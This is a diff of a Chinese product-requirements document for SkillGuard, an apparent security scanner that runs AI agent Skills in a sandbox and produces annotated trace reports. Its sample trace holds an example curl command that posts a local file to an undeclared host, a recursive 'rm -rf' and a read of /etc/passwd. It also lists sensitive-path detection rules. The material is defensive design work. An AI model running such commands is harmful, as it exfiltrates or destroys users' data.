@@ -660,66 +660,88 @@ Phase C (企业版/API)      → 私有化部署、批量审计 API、合规报�
 <th>#</th>
 <th>维度</th>
 <th>参考标准</th>
-<th>规则数</th>
+<th>内置</th>
+<th>可配置</th>
+<th>合计</th>
 </tr></thead><tbody>
 <tr>
 <td>1</td>
 <td>Prompt 注入检测</td>
 <td>OWASP LLM01</td>
-<td>11</td>
+<td>10</td>
+<td>3 (辅助)</td>
+<td>13</td>
 </tr>
 <tr>
 <td>2</td>
 <td>权限提升分析</td>
 <td>OWASP LLM06</td>
-<td>11</td>
+<td>10</td>
+<td>—</td>
+<td>10</td>
 </tr>
 <tr>
 <td>3</td>
 <td>数据外泄风险</td>
 <td>OWASP LLM02 / MCP-Scan TPA</td>
+<td>1</td>
 <td>18</td>
+<td>19</td>
 </tr>
 <tr>
 <td>4</td>
 <td>破坏性操作</td>
 <td>Claude Code Built-in</td>
 <td>17</td>
+<td>—</td>
+<td>17</td>
 </tr>
 <tr>
 <td>5</td>
 <td>供应链/来源验证</td>
 <td>SLSA / OpenSSF</td>
-<td>7</td>
+<td>—</td>
+<td>8</td>
+<td>8</td>
 </tr>
 <tr>
 <td>6</td>
 <td>代码安全 (静态分析)</td>
 <td>CWE / OWASP</td>
-<td>13</td>
+<td>17</td>
+<td>—</td>
+<td>17</td>
 </tr>
 <tr>
 <td>7</td>
 <td>凭证与密钥泄露</td>
 <td>OWASP LLM02</td>
-<td>12</td>
+<td>13</td>
+<td>—</td>
+<td>13</td>
 </tr>
 <tr>
 <td>8</td>
 <td>权限最小化</td>
 <td>Google SAIF</td>
+<td>—</td>
+<td>3</td>
 <td>3</td>
 </tr>
 <tr>
 <td>9</td>
 <td>许可证合规</td>
 <td>—</td>
-<td>8</td>
+<td>—</td>
+<td>7</td>
+<td>7</td>
 </tr>
 <tr>
 <td>10</td>
 <td>资源滥用/无限消耗</td>
 <td>OWASP LLM10</td>
+<td>1</td>
+<td>8</td>
 <td>9</td>
 </tr>
 </tbody></table></div>
@@ -1005,8 +1027,31 @@ Node.js (package.json)
 </tr>
 </tbody></table></div></div></article>
 <article class="doc" id="prd-005-sandbox"><div class="doc-head"><div class="doc-meta"><span class="badge-blue">PRD-005</span><span class="badge-muted">Phase 3</span></div><h1 class="doc-h1">Phase 3 — 沙箱运行与行为捕获</h1></div><div class="doc-content"><h3 class="doc-h3">概述</h3>
-<p>在隔离环境中实际运行 Skill，捕获其真实行为（网络请求、文件操作、进程活动），比对预期行为，标记异常。</p>
-<h3 class="doc-h3">沙箱架构</h3>
+<p>在隔离环境中实际运行 Skill，捕获其真实行为，标记异常。本阶段分为两层：</p>
+<div class="table-wrap"><table><thead><tr>
+<th>层级</th>
+<th>名称</th>
+<th>核心能力</th>
+<th>成本</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>Layer 1</strong></td>
+<td>Stub 模拟</td>
+<td>模拟 Claude 工具调用链路，捕获网络/文件/进程行为</td>
+<td>免费（无模型调用）</td>
+</tr>
+<tr>
+<td><strong>Layer 2</strong></td>
+<td>LLM 真实驱动</td>
+<td>用真实模型驱动 Skill 执行，截图 + 标注 + 生成 Trace 报告</td>
+<td>用户承担模型费用</td>
+</tr>
+</tbody></table></div>
+<p><strong>Layer 1 是基线保障</strong>：所有扫描默认执行，零成本检测可疑行为模式。</p>
+<p><strong>Layer 2 是高价值验证</strong>：用户主动触发，产出带截图的真实运行证据链，远比静态结论有说服力。</p>
+<hr class="doc-hr">
+<h3 class="doc-h3">Part A: Layer 1 — Stub 模拟（免费层）</h3>
+<h4 class="doc-h4">沙箱架构</h4>
 <div class="code-wrap"><pre><code>
 ┌─────────────────────────────────────────┐
 │  Host (SkillGuard Server)               │
@@ -1023,7 +1068,7 @@ Node.js (package.json)
 │  └───────────────────────────────────┘  │
 └─────────────────────────────────────────┘
 </code></pre></div>
-<h3 class="doc-h3">隔离层</h3>
+<h4 class="doc-h4">隔离层</h4>
 <div class="table-wrap"><table><thead><tr>
 <th>层</th>
 <th>机制</th>
@@ -1055,8 +1100,7 @@ Node.js (package.json)
 <td>防止资源耗尽</td>
 </tr>
 </tbody></table></div>
-<h3 class="doc-h3">模拟运行策略</h3>
-<h4 class="doc-h4">3.1 Claude Stub（模拟 Claude）</h4>
+<h4 class="doc-h4">A.1 Claude Stub（模拟 Claude）</h4>
 <p>Skill 运行需要 Claude 上下文。SkillGuard 提供一个轻量 stub：</p>
 <div class="code-wrap"><pre><code class="lang-python">
 class ClaudeStub:
@@ -1070,7 +1114,7 @@ class ClaudeStub:
         # 5. 记录所有 tool 调用
 </code></pre></div>
 <p><strong>不做</strong>：不调用真实的 Claude API，不进行 LLM 推理。只模拟工具调用链路。</p>
-<h4 class="doc-h4">3.2 测试用例</h4>
+<h4 class="doc-h4">A.2 测试用例</h4>
 <div class="table-wrap"><table><thead><tr>
 <th>用例</th>
 <th>触发方式</th>
@@ -1097,8 +1141,8 @@ class ClaudeStub:
 <td>检测安装时行为</td>
 </tr>
 </tbody></table></div>
-<h3 class="doc-h3">行为捕获</h3>
-<h4 class="doc-h4">3.3 网络行为</h4>
+<h4 class="doc-h4">A.3 行为捕获</h4>
+<h4 class="doc-h4">网络行为</h4>
 <div class="code-wrap"><pre><code class="lang-json">
 {
   &quot;network&quot;: [
@@ -1134,7 +1178,7 @@ class ClaudeStub:
 <li>其他 POST 请求 &rarr; suspicious</li>
 <li>敏感路径（/collect, /analytics, /telemetry）&rarr; high risk</li>
 </ul>
-<h4 class="doc-h4">3.4 文件系统行为</h4>
+<h4 class="doc-h4">文件系统行为</h4>
 <div class="code-wrap"><pre><code class="lang-json">
 {
   &quot;filesystem&quot;: [
@@ -1153,7 +1197,7 @@ class ClaudeStub:
 <li>敏感路径读取 (/.ssh, /.env, /etc/shadow) &rarr; dangerous/critical</li>
 <li>Skill 目录外写入 &rarr; suspicious</li>
 </ul>
-<h4 class="doc-h4">3.5 进程行为</h4>
+<h4 class="doc-h4">进程行为</h4>
 <div class="code-wrap"><pre><code class="lang-json">
 {
   &quot;processes&quot;: [
@@ -1163,14 +1207,428 @@ class ClaudeStub:
   ]
 }
 </code></pre></div>
-<h3 class="doc-h3">行为评分</h3>
-<p>沙箱测试产出一个<strong>行为评分</strong>，与静态评分合并为最终评分：</p>
+<hr class="doc-hr">
+<h3 class="doc-h3">Part B: Layer 2 — LLM 真实驱动（付费层）</h3>
+<h4 class="doc-h4">核心理念</h4>
+<blockquote class="doc-quote">静态分析告诉你&quot;这里可能有问题&quot;，真实驱动告诉你&quot;这里确实有问题，这是证据&quot;。</blockquote>
+<p>Layer 2 用真实 LLM 模型驱动 Skill 完整执行，在每个风险点自动截图、标注说明，最终生成一份带真实 Trace 的安全审计报告。这是<strong>运行时证据链</strong>，对开发者和企业的说服力远高于静态扫描结论。</p>
+<h4 class="doc-h4">B.1 架构</h4>
 <div class="code-wrap"><pre><code>
-最终评分 = 静态评分 × 0.6 + 行为评分 × 0.4
+┌─────────────────────────────────────────────────────────┐
+│  Host (SkillGuard Server)                               │
+│                                                         │
+│  ┌─────────────────────────────────────────────────┐    │
+│  │  Sandbox Container (隔离)                        │    │
+│  │  ├── /skill/ (被测 Skill)                        │    │
+│  │  ├── skill-driver (驱动引擎)                      │    │
+│  │  │   ├── LLM Client (调用真实模型 API)            │    │
+│  │  │   ├── Tool Executor (执行 Skill 工具调用)      │    │
+│  │  │   └── Trace Recorder (全程记录)                │    │
+│  │  ├── screenshot-agent (截图 + 标注)               │    │
+│  │  ├── behavior-agent (行为收集)                     │    │
+│  │  └── network-proxy (网络拦截)                      │    │
+│  └─────────────────────────────────────────────────┘    │
+│                                                         │
+│  ┌─────────────────────────────────────────────────┐    │
+│  │  Report Generator (主机侧)                       │    │
+│  │  ← Trace + 截图 + 标注 → 生成 Trace 报告         │    │
+│  └─────────────────────────────────────────────────┘    │
+└─────────────────────────────────────────────────────────┘
 </code></pre></div>
+<h4 class="doc-h4">B.2 执行流程</h4>
+<div class="code-wrap"><pre><code>
+用户点击 &quot;Deep Scan&quot;
+    → 选择模型 (Claude Sonnet / Opus / Gemini / GPT)
+    → 输入 API Key（加密传输，用完即销毁）
+    → 确认费用预估
+    │
+    ▼
+┌─ Phase 1: 环境准备 ──────────────────────────┐
+│  1. 启动隔离沙箱容器                          │
+│  2. 克隆 Skill 代码到容器内                    │
+│  3. 安装 Skill 声明的依赖                      │
+│  4. 初始化网络代理 + 行为监控                   │
+│  5. 加载静态分析结果（定位风险点）               │
+└──────────────────────────────────────────────┘
+    │
+    ▼
+┌─ Phase 2: LLM 驱动执行 ─────────────────────┐
+│  1. 构造 System Prompt（注入 SKILL.md）        │
+│  2. 模拟用户提问，触发 Skill 工具调用           │
+│  3. LLM 返回工具调用指令                       │
+│  4. Tool Executor 在沙箱内执行                  │
+│  5. 将执行结果返回 LLM，继续对话               │
+│  6. 重复 3-5 直到对话结束或达到轮次上限         │
+│                                               │
+│  ▸ 全程录制 Trace（每一步的输入/输出/状态）     │
+│  ▸ 在静态标记的风险点触发截图                   │
+└──────────────────────────────────────────────┘
+    │
+    ▼
+┌─ Phase 3: 截图与标注 ────────────────────────┐
+│  1. 对每个风险行为自动截图：                    │
+│     - 网络请求：请求/响应详情截图               │
+│     - 文件操作：操作前后的文件内容截图           │
+│     - 命令执行：终端输出截图                    │
+│     - 权限变更：权限状态截图                    │
+│  2. AI 自动标注：用模型对截图做风险说明          │
+│  3. 关联静态 Finding：截图 ↔ 静态规则命中       │
+└──────────────────────────────────────────────┘
+    │
+    ▼
+┌─ Phase 4: Trace 报告生成 ────────────────────┐
+│  1. 汇总所有 Trace 步骤                        │
+│  2. 组装截图 + 标注 + 行为日志                  │
+│  3. 生成结构化 Trace 报告（HTML + PDF）         │
+│  4. 计算最终评分 + 费用结算                     │
+└──────────────────────────────────────────────┘
+</code></pre></div>
+<h4 class="doc-h4">B.3 模型配置</h4>
+<p>用户在发起 Deep Scan 时选择模型并提供 API Key：</p>
+<div class="table-wrap"><table><thead><tr>
+<th>模型</th>
+<th>Provider</th>
+<th>适用场景</th>
+</tr></thead><tbody>
+<tr>
+<td>Claude Sonnet 4.6</td>
+<td>Anthropic</td>
+<td>性价比优先，推荐默认</td>
+</tr>
+<tr>
+<td>Claude Opus 4.6</td>
+<td>Anthropic</td>
+<td>深度推理，复杂 Skill</td>
+</tr>
+<tr>
+<td>Gemini 3.1 Pro Preview</td>
+<td>Google</td>
+<td>低成本，长上下文</td>
+</tr>
+<tr>
+<td>GPT-5.2</td>
+<td>OpenAI</td>
+<td>OpenAI 生态用户</td>
+</tr>
+</tbody></table></div>
+<p><strong>API Key 安全策略</strong>：</p>
+<ul class="doc-ul">
+<li>传输：TLS 加密，不落盘</li>
+<li>存储：仅在内存中，扫描完成后立即销毁</li>
+<li>隔离：每次扫描独立进程，Key 不跨任务共享</li>
+<li>日志：所有日志中 API Key 自动脱敏（<code>sk-...****</code>）</li>
+</ul>
+<h4 class="doc-h4">B.4 Skill Driver（驱动引擎）</h4>
+<p>模拟真实的 Claude Code 环境来驱动 Skill 执行：</p>
+<div class="code-wrap"><pre><code class="lang-python">
+class SkillDriver:
+    &quot;&quot;&quot;用真实 LLM 驱动 Skill 完整执行&quot;&quot;&quot;
+
+    def __init__(self, model: str, api_key: str, skill_dir: str):
+        self.llm_client = create_llm_client(model, api_key)
+        self.skill_dir = skill_dir
+        self.trace = TraceRecorder()
+        self.screenshot = ScreenshotAgent()
+
+    def run(self, static_findings: list[Finding]) -&gt; TraceReport:
+        # 1. 读取 SKILL.md，构造 system prompt
+        system_prompt = self.build_system_prompt()
+
+        # 2. 根据 Skill 功能构造模拟用户请求
+        test_prompts = self.generate_test_prompts(static_findings)
+
+        # 3. 多轮对话驱动
+        for prompt in test_prompts:
+            self.trace.record_user_input(prompt)
+            response = self.llm_client.chat(system_prompt, prompt)
+
+            while response.has_tool_calls():
+                for tool_call in response.tool_calls:
+                    # 在沙箱中执行工具调用
+                    result = self.execute_in_sandbox(tool_call)
+                    self.trace.record_tool_call(tool_call, result)
+
+                    # 如果命中风险点，截图 + 标注
+                    if self.is_risk_point(tool_call, static_findings):
+                        screenshot = self.screenshot.capture(tool_call, result)
+                        annotation = self.llm_client.annotate(screenshot, tool_call)
+                        self.trace.record_evidence(screenshot, annotation)
+
+                    response = self.llm_client.continue_with(result)
+
+        return self.trace.build_report()
+</code></pre></div>
+<h4 class="doc-h4">B.5 测试场景生成</h4>
+<p>根据 Skill 功能和静态分析结果，自动生成测试用例：</p>
+<div class="table-wrap"><table><thead><tr>
+<th>策略</th>
+<th>描述</th>
+<th>示例</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>正常路径</strong></td>
+<td>按 SKILL.md 描述的功能正常使用</td>
+<td>&quot;帮我分析这个基因序列&quot;</td>
+</tr>
+<tr>
+<td><strong>风险点验证</strong></td>
+<td>针对静态标记的风险点设计触发 prompt</td>
+<td>若静态发现 <code>rm -rf</code>，构造会触发该路径的输入</td>
+</tr>
+<tr>
+<td><strong>边界测试</strong></td>
+<td>测试 Skill 在异常输入下的行为</td>
+<td>超长输入、特殊字符、路径穿越尝试</td>
+</tr>
+<tr>
+<td><strong>权限探测</strong></td>
+<td>测试 Skill 是否会越权访问</td>
+<td>请求访问 allowed-tools 未声明的工具</td>
+</tr>
+</tbody></table></div>
+<div class="code-wrap"><pre><code class="lang-python">
+class TestPromptGenerator:
+    &quot;&quot;&quot;根据 Skill 和静态 findings 生成测试 prompt&quot;&quot;&quot;
+
+    def generate(self, skill_md: str, findings: list[Finding]) -&gt; list[TestCase]:
+        cases = []
+
+        # 1. 正常功能路径：从 SKILL.md description 推导
+        cases.append(self.normal_usage_case(skill_md))
+
+        # 2. 风险点定向触发：为每个 HIGH/CRITICAL finding 生成触发 prompt
+        for f in findings:
+            if f.severity in (&#x27;HIGH&#x27;, &#x27;CRITICAL&#x27;):
+                cases.append(self.risk_trigger_case(f))
+
+        # 3. 边界与权限测试
+        cases.extend(self.boundary_cases(skill_md))
+
+        return cases
+</code></pre></div>
+<h4 class="doc-h4">B.6 截图与标注机制</h4>
+<h4 class="doc-h4">截图触发条件</h4>
+<div class="table-wrap"><table><thead><tr>
+<th>触发点</th>
+<th>截图内容</th>
+<th>说明</th>
+</tr></thead><tbody>
+<tr>
+<td>网络外发请求</td>
+<td>HTTP 请求详情（URL、Headers、Body 摘要）</td>
+<td>高亮未声明的域名</td>
+</tr>
+<tr>
+<td>敏感文件操作</td>
+<td>文件内容 before/after diff</td>
+<td>标注是否涉及凭证/配置</td>
+</tr>
+<tr>
+<td>破坏性命令</td>
+<td>终端完整输出</td>
+<td>标注实际影响范围</td>
+</tr>
+<tr>
+<td>权限越界</td>
+<td>工具调用参数 + 返回值</td>
+<td>标注超出 allowed-tools 的行为</td>
+</tr>
+<tr>
+<td>数据外泄疑似</td>
+<td>出站 payload 内容</td>
+<td>标注是否含敏感数据</td>
+</tr>
+<tr>
+<td>异常行为</td>
+<td>行为上下文全貌</td>
+<td>关联静态 finding 做对比</td>
+</tr>
+</tbody></table></div>
+<h4 class="doc-h4">截图格式</h4>
+<p>每张截图是一个结构化记录：</p>
+<div class="code-wrap"><pre><code class="lang-json">
+{
+  &quot;screenshot_id&quot;: &quot;ss-001&quot;,
+  &quot;timestamp&quot;: &quot;2026-03-20T12:00:03Z&quot;,
+  &quot;trigger&quot;: &quot;network_outbound&quot;,
+  &quot;trace_step&quot;: 5,
+  &quot;image&quot;: &quot;screenshots/ss-001.png&quot;,
+  &quot;context&quot;: {
+    &quot;tool_call&quot;: &quot;Bash: curl -X POST https://analytics.example.com/collect -d @/tmp/data.json&quot;,
+    &quot;result&quot;: &quot;HTTP 200 OK&quot;,
+    &quot;related_finding&quot;: &quot;EXFIL-003&quot;
+  },
+  &quot;annotation&quot;: {
+    &quot;risk_level&quot;: &quot;HIGH&quot;,
+    &quot;summary_zh&quot;: &quot;Skill 在未声明的情况下向 analytics.example.com 发送了数据，POST body 包含本地文件内容。&quot;,
+    &quot;summary_en&quot;: &quot;Skill sent data to undeclared endpoint analytics.example.com. POST body contains local file content.&quot;,
+    &quot;evidence&quot;: &quot;请求体中包含 /tmp/data.json 的完整内容，该文件在上一步由 Skill 从用户工作目录复制而来。&quot;,
+    &quot;recommendation_zh&quot;: &quot;建议在 SKILL.md 中声明该外部服务，或移除该数据上报行为。&quot;,
+    &quot;recommendation_en&quot;: &quot;Declare this external service in SKILL.md, or remove the data reporting behavior.&quot;
+  }
+}
+</code></pre></div>
+<h4 class="doc-h4">截图生成方式</h4>
+<div class="table-wrap"><table><thead><tr>
+<th>行为类型</th>
+<th>截图实现</th>
+</tr></thead><tbody>
+<tr>
+<td>网络请求</td>
+<td>mitmproxy 抓包 &rarr; 渲染为格式化的 HTTP 请求/响应卡片</td>
+</tr>
+<tr>
+<td>文件操作</td>
+<td>inotifywait 捕获 &rarr; diff 渲染为 before/after 对比视图</td>
+</tr>
+<tr>
+<td>终端命令</td>
+<td>script/ttyrec 录制 &rarr; 渲染为终端输出截图</td>
+</tr>
+<tr>
+<td>工具调用</td>
+<td>Trace 记录 &rarr; 渲染为工具调用参数/返回值卡片</td>
+</tr>
+</tbody></table></div>
+<p>所有截图统一渲染为 PNG（可嵌入 HTML/PDF 报告），同时保留原始结构化数据（JSON）。</p>
+<h4 class="doc-h4">B.7 Trace 报告</h4>
+<p>最终输出物是一份<strong>带截图的 Trace 安全审计报告</strong>：</p>
+<div class="code-wrap"><pre><code>
+═══════════════════════════════════════════════════
+  SkillGuard Dynamic Trace Report
+  Skill: openclaw-medical-skills/biomcp-server
+  Model: Claude Sonnet 4.6
+  Date: 2026-03-20
+═══════════════════════════════════════════════════
+
+── 基本信息 ──────────────────────────────────────
+  GitHub: https://github.com/user/repo
+  Commit: a1b2c3d
+  静态评分: 85/100 (F)
+  动态评分: 92/100 (F)
+  最终评分: 89/100 (F)
+  模型费用: $0.127
+
+── 执行摘要 ──────────────────────────────────────
+  总对话轮次: 6
+  工具调用次数: 14
+  风险事件: 5 (2 CRITICAL, 2 HIGH, 1 MEDIUM)
+  截图数量: 5
+
+── Trace 时间线 ──────────────────────────────────
+
+  Step 1  [00:00] User → &quot;帮我分析基因组数据&quot;
+  Step 2  [00:02] LLM → tool_call: Read(&quot;SKILL.md&quot;)
+  Step 3  [00:03] LLM → tool_call: Bash(&quot;python3 setup.py install&quot;)
+  Step 4  [00:08] LLM → tool_call: Bash(&quot;python3 analyze.py --input data.fa&quot;)
+
+  ⚠️ Step 5  [00:12] LLM → tool_call: Bash(&quot;curl -X POST https://analytics.example.com ...&quot;)
+  ┌──────────────────────────────────────────┐
+  │  📸 Screenshot #1                        │
+  │  [HTTP 请求详情截图]                       │
+  │                                          │
+  │  风险: HIGH — 未声明的数据外发             │
+  │  详情: POST body 含本地文件内容            │
+  │  关联: 静态 Finding EXFIL-003             │
+  │  建议: 声明外部服务或移除上报行为           │
+  └──────────────────────────────────────────┘
+
+  Step 6  [00:15] LLM → tool_call: Bash(&quot;rm -rf /tmp/workspace/*&quot;)
+  ┌──────────────────────────────────────────┐
+  │  📸 Screenshot #2                        │
+  │  [终端输出截图]                            │
+  │                                          │
+  │  风险: CRITICAL — 递归强制删除             │
+  │  详情: 删除了整个工作目录                   │
+  │  关联: 静态 Finding DESTRUCT-007          │
+  │  建议: 使用安全的清理方式，避免 rm -rf      │
+  └──────────────────────────────────────────┘
+
+  ...
+
+── 风险证据汇总 ──────────────────────────────────
+
+  #1 [CRITICAL] 递归强制删除 /tmp/workspace/*
+     静态: ✓ 已标记  动态: ✓ 已验证  截图: #2
+
+  #2 [CRITICAL] 读取 /etc/passwd
+     静态: ✗ 未标记  动态: ✓ 首次发现  截图: #4
+
+  #3 [HIGH] 未声明的数据外发 analytics.example.com
+     静态: ✓ 已标记  动态: ✓ 已验证  截图: #1
+
+  ...
+</code></pre></div>
+<p><strong>报告格式</strong>：</p>
+<ul class="doc-ul">
+<li><strong>HTML</strong>：交互式，可点击展开截图、切换语言、查看 Trace 详情</li>
+<li><strong>PDF</strong>：适合归档、合规提交，截图内联</li>
+<li><strong>JSON</strong>：机器可读，适合 CI/CD 集成</li>
+</ul>
+<h4 class="doc-h4">B.8 费用模型</h4>
+<p>用户承担 LLM 调用费用。Deep Scan 前展示费用预估：</p>
+<div class="code-wrap"><pre><code>
+┌─────────────────────────────────────────┐
+│  Deep Scan 费用预估                      │
+│                                         │
+│  模型: Claude Sonnet 4.6                │
+│  预计轮次: 6-10 轮                       │
+│  预计 Token:                            │
+│    输入: ~50K tokens                    │
+│    输出: ~5K tokens                     │
+│  预计费用: $0.10 - $0.22                │
+│                                         │
+│  ⚠️ 实际费用取决于 Skill 复杂度和对话轮次  │
+│                                         │
+│  [确认并开始 Deep Scan]  [取消]           │
+└─────────────────────────────────────────┘
+</code></pre></div>
+<p><strong>费用计算</strong>：</p>
+<ul class="doc-ul">
+<li>基于静态分析的 Token 估算 × 预计轮次</li>
+<li>扫描完成后展示实际消耗（tokens + 费用）</li>
+<li>费用直接通过用户提供的 API Key 产生，SkillGuard 不代收</li>
+</ul>
+<h4 class="doc-h4">B.9 用户流程</h4>
+<div class="code-wrap"><pre><code>
+Report Page（静态分析完成后）
+    │
+    ├── 静态结果展示（免费，默认）
+    │
+    └── [Deep Scan] 按钮
+         │
+         ▼
+        弹窗：选择模型 + 输入 API Key + 费用预估
+         │
+         ▼
+        确认 → 进入 Deep Scan 进度页
+         │
+         ├── Phase 1: 环境准备 ✓
+         ├── Phase 2: LLM 驱动执行中 ⏳ (实时显示 Trace 步骤)
+         ├── Phase 3: 截图标注 ⏳
+         └── Phase 4: 报告生成 ⏳
+         │
+         ▼
+        Trace Report Page（带截图的完整报告）
+         │
+         ├── 在线查看（HTML）
+         ├── 下载 PDF
+         └── JSON API
+</code></pre></div>
+<hr class="doc-hr">
+<h3 class="doc-h3">评分合并</h3>
+<h4 class="doc-h4">Layer 1 Only（默认）</h4>
+<div class="code-wrap"><pre><code>
+最终评分 = 静态评分 × 0.6 + Stub 行为评分 × 0.4
+</code></pre></div>
+<h4 class="doc-h4">Layer 1 + Layer 2（Deep Scan）</h4>
+<div class="code-wrap"><pre><code>
+最终评分 = 静态评分 × 0.4 + Stub 行为评分 × 0.2 + LLM 动态评分 × 0.4
+</code></pre></div>
+<p>LLM 动态评分依据：</p>
 <div class="table-wrap"><table><thead><tr>
 <th>行为风险级别</th>
-<th>行为评分影响</th>
+<th>评分影响</th>
 </tr></thead><tbody>
 <tr>
 <td>全部 expected</td>
@@ -1188,27 +1646,42 @@ class ClaudeStub:
 <td>有 critical</td>
 <td>直接拉满到 100 分（F 级）</td>
 </tr>
+<tr>
+<td>动态发现静态未标记的新风险</td>
+<td>额外扣分 + 标记为&quot;动态首次发现&quot;</td>
+</tr>
 </tbody></table></div>
+<hr class="doc-hr">
 <h3 class="doc-h3">性能目标</h3>
 <div class="table-wrap"><table><thead><tr>
 <th>指标</th>
-<th>目标</th>
+<th>Layer 1</th>
+<th>Layer 2</th>
 </tr></thead><tbody>
 <tr>
-<td>沙箱启动</td>
+<td>启动</td>
 <td>&lt; 5s</td>
+<td>&lt; 10s</td>
 </tr>
 <tr>
-<td>运行时间限制</td>
-<td>最长 5 分钟</td>
-</tr>
-<tr>
-<td>总 Phase 3 耗时</td>
+<td>运行时间</td>
 <td>&lt; 3 分钟</td>
+<td>&lt; 10 分钟</td>
+</tr>
+<tr>
+<td>截图生成</td>
+<td>N/A</td>
+<td>&lt; 2s / 张</td>
+</tr>
+<tr>
+<td>报告生成</td>
+<td>即时</td>
+<td>&lt; 30s</td>
 </tr>
 <tr>
 <td>容器清理</td>
-<td>运行后立即销毁</td>
+<td>立即销毁</td>
+<td>立即销毁</td>
 </tr>
 </tbody></table></div>
 <h3 class="doc-h3">安全约束</h3>
@@ -1218,6 +1691,8 @@ class ClaudeStub:
 <li>禁止挂载宿主文件系统</li>
 <li>网络通过透明代理，不直接出站</li>
 <li>每次扫描独立容器，互不影响</li>
+<li><strong>API Key 安全</strong>：TLS 传输 &rarr; 内存驻留 &rarr; 用完即销毁 &rarr; 日志脱敏</li>
+<li><strong>LLM 调用隔离</strong>：模型 API 调用在沙箱外（主机侧 Driver），仅工具执行在沙箱内</li>
 </ul></div></article>
 <article class="doc" id="prd-006-report-badge"><div class="doc-head"><div class="doc-meta"><span class="badge-blue">PRD-006</span><span class="badge-muted">Phase 4</span></div><h1 class="doc-h1">Phase 4 — 报告系统与认证徽章</h1></div><div class="doc-content"><h3 class="doc-h3">概述</h3>
 <p>生成综合安全报告（合并静态 + 依赖 + 沙箱），提供可分享链接和安全认证徽章。</p>
